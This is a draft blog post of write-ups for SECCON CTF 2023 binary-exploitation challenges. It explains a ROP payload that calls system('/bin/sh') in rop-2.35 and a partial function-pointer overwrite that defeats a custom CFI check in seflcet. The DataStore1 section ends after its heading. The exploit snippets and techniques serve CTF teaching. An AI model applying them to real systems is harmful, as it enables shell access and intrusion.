---
title: "SECCON CTF 2023 Writeups"
date: 2023-09-27T10:39:43+07:00
draft: true
categories: 
  - writeups
tags:
  - pwn
summary: "Secconctf 2023 Writeups"
# featuredImage: 
---

# rop-2.35

During returning, `rax` holds address of the buffer. Use the gadget `00000000000401169 mov rdi, rax; call _system;` to call `system('/bin/sh\x00')`. Stack might be overwritten while processing so reserve some space for stack using some `ret`.

```python
ret = 0x00401194
payload = b'/bin/sh\x00'
payload += b'a'*(0x18- len(payload)) + p64(ret)*4 + p64(0x000000000401169)
p.sendlineafter(b'Enter something:\n', payload)
p.sendline(b'cat f*')
```

# seflcet

The program contains an overflow this whole struct in `read_member()`

```c
typedef struct {
  char key[KEY_SIZE];
  char buf[KEY_SIZE];
  const char *error;
  int status;
  void (*throw)(int, const char*, ...);
} ctx_t;
```

then it check `status` and call `throw(status, error)`.

## CFI

The program wraps the call to `throw()` inside `CFI()` macro. It checks whether a function pointer points to an `endbr64` instruction. This mechanism implemented by Intel is called CET ([Control Flow Enforcement Technology](https://en.wikipedia.org/wiki/Control-flow_integrity#Intel_Control-flow_Enforcement_Technology)). GCC and clang enabled this mitigation when `-fcf-protection=branch` is provided. But in this challenge, author manually implemented it without enabling CET, hence the name of this challenge.

## Partial overwrite

We can overwrite lowest 2 bytes of `throw`, which initially points to `err`, to point it to another funtion in libc. 

You can find functions lying near `err` by:

```
$ nm -CD ./libc.so.6 | sort | grep -w err -C 10
0000000000120b60 W twalk_r@@GLIBC_2.30
0000000000120c10 W tdestroy@@GLIBC_2.2.5
0000000000120dc0 T lsearch@@GLIBC_2.2.5
0000000000120e60 T lfind@@GLIBC_2.2.5
0000000000120ff0 T vwarn@@GLIBC_2.2.5
0000000000121000 T vwarnx@@GLIBC_2.2.5
0000000000121010 T warn@@GLIBC_2.2.5
00000000001210d0 T warnx@@GLIBC_2.2.5
0000000000121190 T verr@@GLIBC_2.2.5
00000000001211b0 T verrx@@GLIBC_2.2.5
00000000001211d0 T err@@GLIBC_2.2.5
0000000000121270 T errx@@GLIBC_2.2.5
00000000001214e0 W error@@GLIBC_2.2.5
0000000000121700 W error_at_line@@GLIBC_2.2.5
00000000001217b0 T ustat@GLIBC_2.2.5
0000000000121c60 W get_nprocs@@GLIBC_2.2.5
0000000000121ca0 W get_nprocs_conf@@GLIBC_2.2.5
0000000000121da0 W get_phys_pages@@GLIBC_2.2.5
0000000000121e30 W get_avphys_pages@@GLIBC_2.2.5
0000000000121ec0 T dirname@@GLIBC_2.2.5
0000000000121f80 T getloadavg@@GLIBC_2.2.5
```

and `err` is not far from `warn` so we use `warn` to leak (`warn` is similar to `printf`).

## Exploit

First call `warn(write@GOT)`.

Then we must find a way to return to main for further calls. There are two options, use `__libc_start_main` or register exit handler using `atexit(main)`.

Then write `/bin/sh\x00` to bss with `gets()` and call `system(bss)`

`warn(write@GOT)` -> `__libc_start_main` -> `gets(bss+0x300)` -> `system(bss+0x300)`

## Intended solution

The intended solution was to `prctl(ARCH_SET_FS, bss)`, which effectively sets the security cookie to 0. Since the overflow is big enough, one can reach the return address from `main()` and start ROPping. 

# DataStore1

## Vulnerabilities



